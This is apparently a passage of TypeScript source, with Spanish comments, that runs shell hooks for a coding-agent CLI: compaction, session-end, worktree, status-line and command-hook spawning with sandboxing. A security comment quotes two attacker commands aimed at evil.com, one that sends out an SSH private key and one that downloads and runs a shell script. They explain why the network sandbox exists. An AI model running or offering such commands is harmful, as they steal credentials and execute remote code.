    notification_type: notification.notificationType,
  }
  await executeHooksOutsideREPL({ hookInput, matchQuery: notification.notificationType, timeoutMs })
}

export async function executeConfigChangeHooks(
  source: string,
  filePath?: string,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): Promise<HookOutsideReplResult[]> {
  const hookInput = { ...createBaseHookInput(), hook_event_name: 'ConfigChange', source, file_path: filePath }
  return executeHooksOutsideREPL({ hookInput, matchQuery: source, timeoutMs })
}

type EnvHookOutcome = { results: HookOutsideReplResult[]; watchPaths: string[]; systemMessages: string[] }

function collectEnvOutcome(results: HookOutsideReplResult[]): EnvHookOutcome {
  return {
    results,
    watchPaths: results.flatMap((r) => r.watchPaths ?? []),
    systemMessages: results.flatMap((r) => (r.systemMessage ? [r.systemMessage] : [])),
  }
}

export async function executeCwdChangedHooks(
  oldCwd: string,
  newCwd: string,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): Promise<EnvHookOutcome> {
  const hookInput = { ...createBaseHookInput(), hook_event_name: 'CwdChanged', old_cwd: oldCwd, new_cwd: newCwd }
  return collectEnvOutcome(await executeHooksOutsideREPL({ hookInput, timeoutMs }))
}

/** FileChanged casa su matcher contra el NOMBRE del archivo, no la ruta. */
export async function executeFileChangedHooks(
  filePath: string,
  event: string,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): Promise<EnvHookOutcome> {
  const hookInput = { ...createBaseHookInput(), hook_event_name: 'FileChanged', file_path: filePath, event }
  const name = filePath.split('/').pop() ?? filePath
  return collectEnvOutcome(await executeHooksOutsideREPL({ hookInput, matchQuery: name, timeoutMs }))
}

/**
 * PreCompact (`Tse`): la salida de los hooks que terminan bien se une como
 * instrucciones de compactación nuevas, y cada hook deja una línea para el
 * usuario. Un hook que bloquea se nombra en `blockedBy`.
 */
export async function executePreCompactHooks(
  params: { trigger: string; customInstructions: string | null },
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): Promise<{ newCustomInstructions?: string; userDisplayMessage?: string; blockedBy?: string }> {
  const hookInput = {
    ...createBaseHookInput(),
    hook_event_name: 'PreCompact',
    trigger: params.trigger,
    custom_instructions: params.customInstructions,
  }
  const results = await executeHooksOutsideREPL({ hookInput, matchQuery: params.trigger, signal, timeoutMs })
  if (results.length === 0) return {}
  const instructions = results.filter((r) => r.succeeded && !r.blocked && r.output.trim()).map((r) => r.output.trim())
  const lines: string[] = []
  for (const r of results) {
    if (r.cancelled) continue
    const out = r.output.trim()
    if (r.succeeded && !r.blocked) lines.push(`PreCompact [${r.command}] completed successfully${out ? `: ${out}` : ''}`)
    else lines.push(`PreCompact [${r.command}] failed${out ? `: ${out}` : ''}`)
  }
  const blocked = results.filter((r) => r.blocked)
  return {
    ...(instructions.length > 0 && { newCustomInstructions: instructions.join('\n\n') }),
    ...(lines.length > 0 && { userDisplayMessage: lines.join('\n') }),
    ...(blocked.length > 0 && {
      blockedBy: blocked.map((r) => `[${r.command}]${r.output.trim() ? `: ${r.output.trim()}` : ''}`).join('\n'),
    }),
  }
}

/**
 * PostCompact (`ccnmt: packages/agent/hooks.ts:4435`): corre los hooks
 * `PostCompact` que casen con el disparador, con el resumen recién
 * producido en `compact_summary`, y devuelve el mensaje que el usuario ve
 * -uno por comando, con su salida-. A diferencia de PreCompact, la salida
 * no vuelve como instrucción: la compactación ya terminó.
 */
export async function executePostCompactHooks(
  params: { trigger: 'manual' | 'auto'; compactSummary: string },
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): Promise<{ userDisplayMessage?: string }> {
  const hookInput = {
    ...createBaseHookInput(),
    hook_event_name: 'PostCompact',
    trigger: params.trigger,
    compact_summary: params.compactSummary,
  }
  const results = await executeHooksOutsideREPL({ hookInput, matchQuery: params.trigger, signal, timeoutMs })
  if (results.length === 0) return {}
  const lines: string[] = []
  for (const r of results) {
    if (r.cancelled) continue
    const out = r.output.trim()
    if (r.succeeded && !r.blocked) lines.push(`PostCompact [${r.command}] completed successfully${out ? `: ${out}` : ''}`)
    else lines.push(`PostCompact [${r.command}] failed${out ? `: ${out}` : ''}`)
  }
  return {
    ...(lines.length > 0 && { userDisplayMessage: lines.join('\n') }),
  }
}

/**
 * El plazo de SessionEnd (`Rse`): la variable manda; si no, el mayor
 * `timeout` declarado por un hook de SessionEnd, con piso de 1 500 ms y
 * techo de 60 000 ms.
 */
export function getSessionEndHookTimeoutMs(): number {
  const declared = process.env.CLAUDE_CODE_SESSIONEND_HOOKS_TIMEOUT_MS
  if (declared !== undefined && declared !== '' && Number.isFinite(Number(declared))) return Number(declared)
  let longest = 0
  for (const group of configuredMatchers('SessionEnd')) {
    for (const hook of group.hooks ?? []) {
      if (hook.timeout && hook.timeout * 1000 > longest) longest = hook.timeout * 1000
    }
  }
  return Math.max(SESSION_END_HOOK_TIMEOUT_MS_DEFAULT, Math.min(longest, SESSION_END_HOOK_TIMEOUT_MS_MAX))
}

export async function executeSessionEndHooks(
  reason: string,
  options?: { signal?: AbortSignal; timeoutMs?: number; [key: string]: unknown },
): Promise<void> {
  const hookInput = { ...createBaseHookInput(), hook_event_name: 'SessionEnd', reason }
  const results = await executeHooksOutsideREPL({
    hookInput,
    matchQuery: reason,
    signal: options?.signal,
    timeoutMs: options?.timeoutMs ?? getSessionEndHookTimeoutMs(),
  })
  for (const r of results) {
    if (!r.succeeded && r.output) process.stderr.write(`SessionEnd hook [${r.command}] failed: ${r.output}\n`)
  }
}

export function hasWorktreeCreateHook(): boolean {
  return hasHookForEvent('WorktreeCreate')
}

/** WorktreeCreate: el hook crea el árbol y su salida es la ruta. */
export async function executeWorktreeCreateHook(name: string): Promise<{ worktreePath: string }> {
  const hookInput = { ...createBaseHookInput(), hook_event_name: 'WorktreeCreate', name }
  const results = await executeHooksOutsideREPL({ hookInput })
  const ok = results.find((r) => r.succeeded && !r.blocked && r.output.trim())
  if (!ok) {
    const why = results.map((r) => `[${r.command}] ${r.output.trim()}`).join('; ') || 'no hay hook WorktreeCreate configurado'
    throw new Error(`WorktreeCreate no devolvió una ruta: ${why}`)
  }
  return { worktreePath: ok.output.trim().split('\n').pop()!.trim() }
}

/** WorktreeRemove: `true` si algún hook corrió con éxito, `false` si no hay. */
export async function executeWorktreeRemoveHook(worktreePath: string): Promise<boolean> {
  if (!hasHookForEvent('WorktreeRemove')) return false
  const hookInput = { ...createBaseHookInput(), hook_event_name: 'WorktreeRemove', worktree_path: worktreePath }
  const results = await executeHooksOutsideREPL({ hookInput })
  return results.some((r) => r.succeeded)
}

type CommandSetting = { type?: string; command?: string }

function commandSetting(key: 'statusLine' | 'fileSuggestion'): CommandSetting | undefined {
  const value = getHooksConfigFromSnapshot()[key] as CommandSetting | undefined
  return value && value.type === 'command' && value.command ? value : undefined
}

/**
 * La línea de estado (`Mpn`): corre el comando de `statusLine` con la entrada
 * por stdin y devuelve su stdout sin líneas vacías; `undefined` si no hay
 * comando, si falla o si se aborta.
 */
export async function executeStatusLineCommand(
  statusInput: unknown,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
  _logResult = false,
): Promise<string | undefined> {
  if (shouldDisableAllHooksIncludingManaged()) return undefined
  const setting = commandSetting('statusLine')
  if (!setting) return undefined
  const run = await runCommand(setting.command!, JSON.stringify(statusInput), timeoutMs, signal)
  if (run.aborted || run.status !== 0) return undefined
  const text = run.stdout.trim().split('\n').map((l) => l.trim()).filter(Boolean).join('\n')
  return text || undefined
}

/** La sugerencia de archivos (`F4n`): una ruta por línea de stdout. */
export async function executeFileSuggestionCommand(
  input: unknown,
  signal?: AbortSignal,
  timeoutMs: number = FILE_SUGGESTION_TIMEOUT_MS,
): Promise<string[]> {
  if (shouldDisableAllHooksIncludingManaged()) return []
  const setting = commandSetting('fileSuggestion')
  if (!setting) return []
  const run = await runCommand(setting.command!, JSON.stringify(input), timeoutMs, signal)
  if (run.aborted || run.status !== 0) return []
  return run.stdout.split('\n').map((l) => l.trim()).filter(Boolean)
}

// --- porte por miembros: un ancla por ítem ---
/**
 * Ejecuta un hook de tipo comando usando bash o PowerShell.
 *
 * Resolución de shell: `hook.shell` → 'bash'. Los hooks de PowerShell
 * lanzan `pwsh` con -NoProfile -NonInteractive -Command y se saltan la
 * preparación específica de bash (conversión de rutas POSIX, auto-prepend
 * de `.sh`, `CLAUDE_CODE_SHELL_PREFIX`). Porte verbatim de
 * `ccnmt: packages/agent/hooks.ts:925-1602`.
 */
export async function execCommandHook(
  hook: HookCommand & { type: 'command' },
  hookEvent: HookEvent | 'StatusLine' | 'FileSuggestion',
  hookName: string,
  jsonInput: string,
  signal: AbortSignal,
  hookId: string,
  hookIndex?: number,
  pluginRoot?: string,
  pluginId?: string,
  skillRoot?: string,
  forceSyncExecution?: boolean,
  requestPrompt?: (request: PromptRequest) => Promise<PromptResponse>,
): Promise<{
  stdout: string
  stderr: string
  output: string
  status: number
  aborted?: boolean
  backgrounded?: boolean
}> {
  // Limitado a eventos de una vez por sesión, para acotar el volumen de
  // diag_log. started/completed viven dentro del try/finally: un throw en
  // la fase de preparación no debe dejar un marcador "started" huérfano —
  // sería indistinguible de un cuelgue.
  const shouldEmitDiag =
    hookEvent === 'SessionStart' ||
    hookEvent === 'Setup' ||
    hookEvent === 'SessionEnd'
  const diagStartMs = Date.now()
  let diagExitCode: number | undefined
  let diagAborted = false

  const isWindows = getPlatform() === 'windows'

  // --
  // Selección de shell por hook (fase 1 de docs/design/ps-shell-selection.md).
  // Orden de resolución: hook.shell → DEFAULT_HOOK_SHELL. El respaldo
  // defaultShell (settings.defaultShell) es la fase 2 — todavía no cableada.
  //
  // El camino de bash es el histórico y no cambia. El de PowerShell
  // deliberadamente se salta las adaptaciones específicas de bash para
  // Windows (conversión cygpath, auto-prepend de .sh, SHELL_PREFIX citado
  // en POSIX).
  const shellType = hook.shell ?? DEFAULT_HOOK_SHELL

  const isPowerShell = shellType === 'powershell'

  // --
  // Camino de bash en Windows: los hooks corren vía Git Bash (Cygwin), NO
  // cmd.exe.
  //
  // Esto significa que toda ruta que se ponga en variables de entorno o se
  // sustituya en la cadena del comando TIENE que ser una ruta POSIX
  // (/c/Users/foo), no una ruta de Windows (C:\Users\foo o C:/Users/foo).
  // Git Bash no puede resolver rutas de Windows.
  //
  // windowsPathToPosixPath() es conversión pura por regex en JS (sin
  // invocar cygpath): C:\Users\foo -> /c/Users/foo, UNC preservado, barras
  // invertidas. Memoizada (LRU-500) para que llamadas repetidas sean baratas.
  //
  // Camino de PowerShell: usa rutas nativas — se salta la conversión por
  // completo. PowerShell espera rutas de Windows en Windows (y rutas
  // nativas en Unix donde pwsh también está disponible).
  const toHookPath =
    isWindows && !isPowerShell
      ? (p: string) => windowsPathToPosixPath(p)
      : (p: string) => p

  // Fija CLAUDE_PROJECT_DIR a la raíz estable del proyecto (no la ruta del
  // worktree). getProjectRoot() nunca se actualiza al entrar a un worktree,
  // así que los hooks que referencian $CLAUDE_PROJECT_DIR siempre resuelven
  // relativo a la raíz real del repo.
  const projectDir = getProjectRoot()

  // Sustituye ${CLAUDE_PLUGIN_ROOT} y ${user_config.X} en la cadena del
  // comando. El orden coincide con MCP/LSP (variables de plugin PRIMERO,
  // luego user config) para que un valor introducido por el usuario que
  // contenga el texto literal ${CLAUDE_PLUGIN_ROOT} se trate como opaco —
  // no se reinterpreta como plantilla.
  let command = hook.command
  let execArgs = hook.args ? [...hook.args] : undefined
  let pluginOpts: ReturnType<typeof loadPluginOptions> | undefined
  if (pluginRoot) {
    // Directorio de plugin ausente (carrera de GC de huérfanos, una sesión
    // concurrente lo borró): se lanza para que los llamadores den un error
    // no bloqueante. Correr fallaría — y `python3 <faltante>.py` sale con
    // 2, el código de "bloqueo" del protocolo de hooks, que rompe
    // UserPromptSubmit/Stop hasta reiniciar. La comprobación previa es
    // necesaria porque "exit 2 por script ausente" es indistinguible de un
    // bloqueo intencional tras el spawn.
    if (!(await pathExists(pluginRoot))) {
      throw new Error(
        `Plugin directory does not exist: ${pluginRoot}` +
          (pluginId ? ` (${pluginId} — run /plugin to reinstall)` : ''),
      )
    }
    // Sustitución de ROOT y DATA inline en vez de llamar a
    // substitutePluginVariables(). Ese helper normaliza \ → / en Windows
    // incondicionalmente — correcto para bash (toHookPath ya produjo
    // /c/... así que es un no-op) pero incorrecto para PS donde toHookPath
    // es identidad y se quieren backslashes nativos C:\.... Inlinear
    // también permite usar la forma función de .replace() para que rutas
    // con $ no se corrompan por interpretación de patrón $ (raro pero
    // posible: \\server\c$\plugin).
    const rootPath = toHookPath(pluginRoot)
    command = command.replace(/\$\{CLAUDE_PLUGIN_ROOT\}/g, () => rootPath)
    execArgs = replaceExecArgTemplate(execArgs, 'CLAUDE_PLUGIN_ROOT', rootPath)
    if (pluginId) {
      const dataPath = toHookPath(getPluginDataDir(pluginId))
      command = command.replace(/\$\{CLAUDE_PLUGIN_DATA\}/g, () => dataPath)
      execArgs = replaceExecArgTemplate(execArgs, 'CLAUDE_PLUGIN_DATA', dataPath)
    }
    if (pluginId) {
      pluginOpts = loadPluginOptions(pluginId)
      if (/\$\{user_config\.[^}]+\}/.test(command)) {
        throw new Error(
          `Plugin hook shell commands cannot interpolate \${user_config.*}. ` +
            'Read CLAUDE_PLUGIN_OPTION_<KEY> from the hook environment instead.',
        )
      }
      execArgs = replaceExecArgUserConfig(execArgs, pluginOpts)
    }
  }

  // En Windows (sólo bash), se antepone `bash` a los scripts .sh para que
  // se ejecuten en vez de abrirse con el manejador de archivo por defecto.
  // PowerShell corre archivos .ps1 nativamente — no necesita prepend.
  if (isWindows && !isPowerShell && command.trim().match(/\.sh(\s|$|")/)) {
    if (!command.trim().startsWith('bash ')) {
      command = `bash ${command}`
    }
  }

  // CLAUDE_CODE_SHELL_PREFIX envuelve el comando con quoting POSIX
  // (formatShellPrefixCommand usa shell-quote). Esto no tiene sentido para
  // PowerShell — ver diseño §8.1. Por ahora los hooks de PS ignoran el
  // prefijo; un CLAUDE_CODE_PS_SHELL_PREFIX (o un prefijo consciente del
  // shell) queda como trabajo futuro.
  const shellPrefix = readEnv('CLAUDE_CODE_SHELL_PREFIX')
  const finalCommand =
    !execArgs && !isPowerShell && shellPrefix
      ? formatShellPrefixCommand(shellPrefix, command)
      : command

  const hookTimeoutMs = hook.timeout
    ? hook.timeout * 1000
    : TOOL_HOOK_EXECUTION_TIMEOUT_MS

  // Arma las variables de entorno — todas las rutas pasan por toHookPath
  // para la conversión POSIX de Windows.
  const envVars: NodeJS.ProcessEnv = {
    ...subprocessEnv(),
    CLAUDE_PROJECT_DIR: toHookPath(projectDir),
  }

  // Porte de ant v2.1.133 PPK→oPK (4716.js). Cuando el JSON de entrada del
  // hook lleva una cadena `effort.level` (el mismo campo expuesto en el
  // esquema de entrada del hook), se reenvía como CLAUDE_EFFORT para que
  // los scripts de hook y de status-line puedan ramificar según el nivel
  // de esfuerzo actual del usuario (ya degradado en silencio a lo que
  // soporte el modelo activo). Parseo defensivo seguro: los payloads
  // antiguos simplemente omiten el campo.
  try {
    const parsedInput = JSON.parse(jsonInput) as
      | { effort?: { level?: unknown } }
      | null
    const effortLevel = parsedInput?.effort?.level
    if (typeof effortLevel === 'string' && effortLevel.length > 0) {
      envVars.CLAUDE_EFFORT = effortLevel
    }
  } catch {
    // Un jsonInput malformado es un bug del llamador; no debe bloquear el hook.
  }

  // Los hooks de plugin y de skill fijan CLAUDE_PLUGIN_ROOT por igual (los
  // skills usan el mismo nombre por consistencia — pueden migrar a plugins
  // sin cambios de código)
  if (pluginRoot) {
    envVars.CLAUDE_PLUGIN_ROOT = toHookPath(pluginRoot)
    if (pluginId) {
      envVars.CLAUDE_PLUGIN_DATA = toHookPath(getPluginDataDir(pluginId))
    }
  }
  // También expone las opciones de plugin como variables de entorno, para
  // que los hooks puedan leerlas sin ${user_config.X} en la cadena del
  // comando. Se incluyen los valores sensibles — los hooks corren código
  // propio del usuario, la misma frontera de confianza que leer el
  // keychain directamente.
  if (pluginOpts) {
    for (const [key, value] of Object.entries(pluginOpts)) {
      // Sanea caracteres que no son de identificador (bash no puede referenciar
      // $FOO-BAR). El esquema de schemas.ts:611 ya restringe las claves a
      // /^[A-Za-z_]\w*$/, así que esto es cinturón y tirantes, pero barato si
      // alguien evita el esquema.
      const envKey = key.replace(/[^A-Za-z0-9_]/g, '_').toUpperCase()
      envVars[`CLAUDE_PLUGIN_OPTION_${envKey}`] = String(value)
    }
  }
  if (skillRoot) {
    envVars.CLAUDE_PLUGIN_ROOT = toHookPath(skillRoot)
  }

  // CLAUDE_ENV_FILE apunta a un archivo .sh donde el hook escribe
  // definiciones de variables de entorno; getHookEnvFilePath() las
  // concatena y el proveedor de bash inyecta el contenido en los comandos
  // de bash. Un hook de PS naturalmente escribiría sintaxis PS ($env:FOO =
  // 'bar'), que bash no puede parsear. Se salta para PS — consistente con
  // cómo el prepend de .sh y SHELL_PREFIX ya son sólo de bash arriba.
  if (
    !isPowerShell &&
    (hookEvent === 'SessionStart' ||
      hookEvent === 'Setup' ||
      hookEvent === 'CwdChanged' ||
      hookEvent === 'FileChanged') &&
    hookIndex !== undefined
  ) {
    envVars.CLAUDE_ENV_FILE = await getHookEnvFilePath(hookEvent, hookIndex)
  }

  // Cuando se eliminan worktrees de agente, getCwd() puede devolver una
  // ruta borrada vía AsyncLocalStorage. Se valida antes de lanzar el
  // proceso porque spawn() emite eventos 'error' asíncronos para un cwd
  // ausente en vez de lanzar de forma síncrona.
  const hookCwd = getCwd()
  const safeCwd = (await pathExists(hookCwd)) ? hookCwd : getOriginalCwd()
  if (safeCwd !== hookCwd) {
    logForDebugging(
      `Hooks: cwd ${hookCwd} not found, falling back to original cwd`,
      { level: 'warn' },
    )
  }

  // Lanzamiento. Dos caminos completamente separados:
  //
  //   Bash: spawn(cmd, [], { shell: <gitBashPath | true> }) — la opción
  //   shell hace que Node le pase la cadena entera al shell para parsear.
  //
  //   PowerShell: spawn(pwshPath, ['-NoProfile', '-NonInteractive',
  //   '-Command', cmd]) — argv explícito, sin opción shell. -NoProfile se
  //   salta los scripts de perfil de usuario (más rápido, determinista).
  //   -NonInteractive falla rápido en vez de preguntar.
  // SEGURIDAD: aplica el sandbox de sólo red a los comandos de hook cuando
  // el sandboxing está habilitado. Los hooks ejecutan comandos de shell
  // arbitrarios desde settings.json sin pasar por el prompt de permisos de
  // la herramienta Bash. A diferencia del sandbox completo de Bash, los
  // hooks sólo reciben restricciones de red (no de filesystem) porque:
  //   - Los hooks legítimos (formateadores, linters, type checkers)
  //     necesitan acceso completo al filesystem para leer/escribir
  //     archivos del proyecto
  //   - La amenaza central de un hook malicioso es exfiltración de datos
  //     (p. ej. `curl http://evil.com?key=$(cat ~/.ssh/id_rsa)`) y descarga
  //     de payload (p. ej. `wget http://evil.com/malware.sh | bash`)
  //   - Los hooks que de verdad necesitan red (notificaciones) deberían
  //     usar el tipo de hook `http`, que no lo afecta este sandbox
  let sandboxedCommand = finalCommand
  if (!isPowerShell && SandboxManager.isSandboxingEnabled()) {
    try {
      sandboxedCommand = await SandboxManager.wrapWithSandbox(
        execArgs ? quote([finalCommand, ...execArgs]) : finalCommand,
        undefined, // usa el shell por defecto
        {
          // Red: deniega toda salida por defecto. Los hooks que necesiten
          // red deben usar el tipo de hook `http` en vez de comandos de shell.
          network: {
            allowedDomains: [],
            deniedDomains: [],
          },
          // Filesystem: sin restricciones adicionales más allá de las del
          // sandbox por defecto. Los hooks necesitan leer/escribir archivos
          // del proyecto libremente (p. ej. prettier --write).
          filesystem: {
            allowWrite: ['/'],
            denyWrite: [],
            allowRead: [],
            denyRead: [],
          },
        },
        signal,
      )
      logForDebugging(
        `Hook command sandboxed (network-only): ${hook.command}`,
        { level: 'verbose' },
      )
    } catch (sandboxError) {
      // FALLA CERRADA: la guarda externa vio isSandboxingEnabled()=true, así
      // que el usuario optó por el sandbox pero el wrap falló. Un respaldo
      // sin sandbox reabriría la amenaza de exfiltración de datos que
      // mitiga el bloque SEGURIDAD. Coincide con exec.ts:190.
      throw new Error(
        `Refusing to run hook "${hook.command}": sandbox wrap failed ` +
          `(${errorMessage(sandboxError)}). Fix sandbox config or disable.`,
      )
    }
  }

  let child: ChildProcessWithoutNullStreams
  if (execArgs && !SandboxManager.isSandboxingEnabled()) {
    child = spawn(finalCommand, execArgs, {
      env: envVars,
      cwd: safeCwd,
      windowsHide: true,
    }) as ChildProcessWithoutNullStreams
  } else if (shellType === 'powershell') {
    const pwshPath = await getCachedPowerShellPath()
    if (!pwshPath) {
      throw new Error(
        `Hook "${hook.command}" has shell: 'powershell' but no PowerShell ` +
          `executable (pwsh or powershell) was found on PATH. Install ` +
          `PowerShell, or remove "shell": "powershell" to use bash.`,
      )
    }
    child = spawn(pwshPath, buildPowerShellArgs(finalCommand), {
      env: envVars,
      cwd: safeCwd,
      // Evita ventana de consola visible en Windows (no-op en otras plataformas)
      windowsHide: true,
    }) as ChildProcessWithoutNullStreams
  } else {
    // En Windows, usa Git Bash explícitamente (cmd.exe no puede correr
    // sintaxis bash). En otras plataformas, shell: true usa /bin/sh.
    // Cuando git-bash está ausente, falla en tiempo de ejecución (los
    // hooks de PowerShell evitan esto).
    if (isWindows && !findGitBashPath()) {
      throw new Error(
        `Hook "${hook.command}" requires git-bash. Install: https://git-scm.com/downloads/win, set CLAUDE_CODE_GIT_BASH_PATH, or use "shell":"powershell".`,
      )
    }
    const shell = isWindows ? findGitBashPath()! : true
    child = spawn(sandboxedCommand, [], {
      env: envVars,
      cwd: safeCwd,
      shell,
      // Evita ventana de consola visible en Windows (no-op en otras plataformas)
      windowsHide: true,
    }) as ChildProcessWithoutNullStreams
  }

  // Los hooks usan modo pipe — stdout tiene que transmitirse a JS para
  // poder parsear la primera línea de respuesta y detectar hooks
  // asíncronos ({"async": true}).
  const hookTaskOutput = new TaskOutput(`hook_${child.pid}`, null)
  const shellCommand = wrapSpawn(child, signal, hookTimeoutMs, hookTaskOutput)
  // Rastrea si la propiedad de shellCommand se transfirió (p. ej. al
  // registro de hooks asíncronos)
  let shellCommandTransferred = false
  // Rastrea si stdin ya se escribió (para evitar errores "write after end")
  let stdinWritten = false

  if ((hook.async || hook.asyncRewake) && !forceSyncExecution) {
    const processId = `async_hook_${child.pid}`
    logForDebugging(
      `Hooks: Config-based async hook, backgrounding process ${processId}`,
    )

    // Escribe stdin antes de pasar a segundo plano para que el hook reciba
    // su entrada. El salto de línea final coincide con el camino síncrono
    // (L1000). Sin él, `read -r line` de bash devuelve exit 1 (EOF antes
    // del delimitador) — la variable SÍ se llena pero `if read -r line;
    // then ...` se salta la rama. Ver gh-30509 / CC-161.
    child.stdin.write(jsonInput + '\n', 'utf8')
    child.stdin.end()
    stdinWritten = true

    const backgrounded = executeInBackground({
      processId,
      hookId,
      shellCommand,
      asyncResponse: { async: true, asyncTimeout: hookTimeoutMs },
      hookEvent,
      hookName,
      command: hook.command,
      asyncRewake: hook.asyncRewake,
      pluginId,
    })
    if (backgrounded) {
      return {
        stdout: '',
        stderr: '',
        output: '',
        status: 0,
        backgrounded: true,
      }
    }
  }

  let stdout = ''
  let stderr = ''
  let output = ''

  // Configura la recolección de datos de salida con codificación UTF-8 explícita
  child.stdout.setEncoding('utf8')
  child.stderr.setEncoding('utf8')

  let initialResponseChecked = false

  let asyncResolve:
    | ((result: {
        stdout: string
        stderr: string
        output: string
        status: number
      }) => void)
    | null = null
  const childIsAsyncPromise = new Promise<{
    stdout: string
    stderr: string
    output: string
    status: number
    aborted?: boolean
  }>(resolve => {
    asyncResolve = resolve
  })

  // Rastrea las líneas de solicitud de prompt (ya recortadas) que se
  // procesaron, para poder quitarlas del stdout final por coincidencia de
  // contenido (sin rastrear índices → sin desfase de índices)
  const processedPromptLines = new Set<string>()
  // Serializa el manejo de prompts asíncronos para que las respuestas salgan en orden
  let promptChain = Promise.resolve()
  // Buffer de línea para detectar solicitudes de prompt en la salida en streaming
  let lineBuffer = ''

  child.stdout.on('data', data => {
    stdout += data
    output += data

    // Cuando se provee requestPrompt, parsea stdout línea por línea buscando solicitudes de prompt
    if (requestPrompt) {
      lineBuffer += data
      const lines = lineBuffer.split('\n')
      lineBuffer = lines.pop() ?? '' // el último elemento es una línea incompleta

      for (const line of lines) {
        const trimmed = line.trim()
        if (!trimmed) continue

        try {
          const parsed = JSON.parse(trimmed)
          const validation = promptRequestSchema().safeParse(parsed)
          if (validation.success) {
            processedPromptLines.add(trimmed)
            logForDebugging(
              `Hooks: Detected prompt request from hook: ${trimmed}`,
            )
            // Encadena el manejo asíncrono para serializar las respuestas de prompt
            const promptReq = validation.data
            const reqPrompt = requestPrompt
            promptChain = promptChain.then(async () => {
              try {
                const response = await reqPrompt(promptReq)
                child.stdin.write(jsonStringify(response) + '\n', 'utf8')
              } catch (err) {
                logForDebugging(`Hooks: Prompt request handling failed: ${err}`)
                // El usuario canceló o el prompt falló — cierra stdin para
                // que el proceso del hook no se quede colgado esperando entrada
                child.stdin.destroy()
              }
            })
          }
        } catch {
          // No es JSON, sólo una línea normal
        }
      }
    }

    // Comprueba si hay respuesta asíncrona en la primera línea de salida. El
    // protocolo async es: el hook emite {"async":true,...} como su PRIMERA
    // línea, luego su salida normal. Sólo se debe parsear la PRIMERA línea —
    // si el proceso es rápido y escribe más antes de que este evento 'data'
    // dispare, parsear el stdout acumulado completo falla y un hook async
    // bloquea por toda su duración en vez de pasar a segundo plano.
    if (!initialResponseChecked) {
      const firstLine = firstLineOf(stdout).trim()
      if (!firstLine.includes('}')) return
      initialResponseChecked = true
      logForDebugging(`Hooks: Checking first line for async: ${firstLine}`)
      try {
        const parsed = JSON.parse(firstLine)
        logForDebugging(
          `Hooks: Parsed initial response: ${jsonStringify(parsed)}`,
        )
        if (isAsyncHookJSONOutput(parsed) && !forceSyncExecution) {
          const processId = `async_hook_${child.pid}`
          logForDebugging(
            `Hooks: Detected async hook, backgrounding process ${processId}`,
          )

          const backgrounded = executeInBackground({
            processId,
            hookId,
            shellCommand,
            asyncResponse: {
              async: true,
              asyncTimeout:
                typeof parsed.asyncTimeout === 'number' ? parsed.asyncTimeout : undefined,
            },
            hookEvent,
            hookName,
            command: hook.command,
            pluginId,
          })
          if (backgrounded) {
            shellCommandTransferred = true
            asyncResolve?.({
              stdout,
              stderr,
              output,
              status: 0,
            })
          }
        } else if (isAsyncHookJSONOutput(parsed) && forceSyncExecution) {
          logForDebugging(
            `Hooks: Detected async hook but forceSyncExecution is true, waiting for completion`,
          )
        } else {
          logForDebugging(
            `Hooks: Initial response is not async, continuing normal processing`,
          )
        }
      } catch (e) {
        logForDebugging(`Hooks: Failed to parse initial response as JSON: ${e}`)
      }
    }
  })

  child.stderr.on('data', data => {
    stderr += data
    output += data
  })

  const stopProgressInterval = startHookProgressInterval({
    hookId,
    hookName,
    hookEvent,
    getOutput: async () => ({ stdout, stderr, output }),
  })

  // Espera a que los streams de stdout y stderr terminen antes de dar la
  // salida por completa. Esto evita una condición de carrera donde 'close'
  // dispara antes de que todos los eventos 'data' se procesen
  const stdoutEndPromise = new Promise<void>(resolve => {
    child.stdout.on('end', () => resolve())
  })

  const stderrEndPromise = new Promise<void>(resolve => {
    child.stderr.on('end', () => resolve())
  })

  // Escribe en stdin, manejando los errores EPIPE que pueden ocurrir cuando
  // el comando del hook termina antes de leer toda la entrada.
  const stdinWritePromise = stdinWritten
    ? Promise.resolve()
    : new Promise<void>((resolve, reject) => {
        child.stdin.on('error', err => {
          // Cuando se provee requestPrompt, stdin se mantiene abierto para
          // respuestas de prompt. Los errores EPIPE de escrituras
          // posteriores (tras salir el proceso) son esperables — se suprimen.
          if (!requestPrompt) {
            reject(err)
          } else {
            logForDebugging(
              `Hooks: stdin error during prompt flow (likely process exited): ${err}`,
            )
          }
        })
        // Codificación UTF-8 explícita para manejar bien caracteres Unicode
        child.stdin.write(jsonInput + '\n', 'utf8')
        // Cuando se provee requestPrompt, deja stdin abierto para respuestas de prompt
        if (!requestPrompt) {
          child.stdin.end()
        }
        resolve()
      })

  // Promesa para el error del proceso hijo
  const childErrorPromise = new Promise<never>((_, reject) => {
    child.on('error', reject)
  })

  // Promesa para el cierre del proceso hijo — sólo resuelve después de que
  // los streams terminen, para asegurar que toda la salida se recolectó
  const childClosePromise = new Promise<{
    stdout: string
    stderr: string
    output: string
    status: number
    aborted?: boolean
  }>(resolve => {
    let exitCode: number | null = null

    child.on('close', code => {
      exitCode = code ?? 1

      // Espera a que ambos streams terminen antes de resolver con la salida final
      void Promise.all([stdoutEndPromise, stderrEndPromise]).then(() => {
        // Quita las líneas que se procesaron como solicitudes de prompt para
        // que parseHookOutput sólo vea el resultado final del hook. El
        // filtrado por contenido contra el conjunto de líneas realmente
        // procesadas asegura que el JSON de prompt nunca se filtre
        // (fail-closed), sin importar la posición de la línea.
        const finalStdout =
          processedPromptLines.size === 0
            ? stdout
            : stdout
                .split('\n')
                .filter(line => !processedPromptLines.has(line.trim()))
                .join('\n')

        resolve({
          stdout: finalStdout,
          stderr,
          output,
          status: exitCode!,
          aborted: signal.aborted,
        })
      })
    })
  })

  // Carrera entre la escritura de stdin, la detección async, y la
  // finalización del proceso
  try {
    if (shouldEmitDiag) {
      logForDiagnosticsNoPII('info', 'hook_spawn_started', {
        hook_event_name: hookEvent,
        index: hookIndex,
      })
    }
    await Promise.race([stdinWritePromise, childErrorPromise])

    // Espera a que se envíen las respuestas de prompt pendientes antes de resolver
    const result = await Promise.race([
      childIsAsyncPromise,
      childClosePromise,
      childErrorPromise,
    ])
    // Asegura que todas las respuestas de prompt encoladas se enviaron
    await promptChain
    diagExitCode = result.status
    diagAborted = result.aborted ?? false
    return result
  } catch (error) {
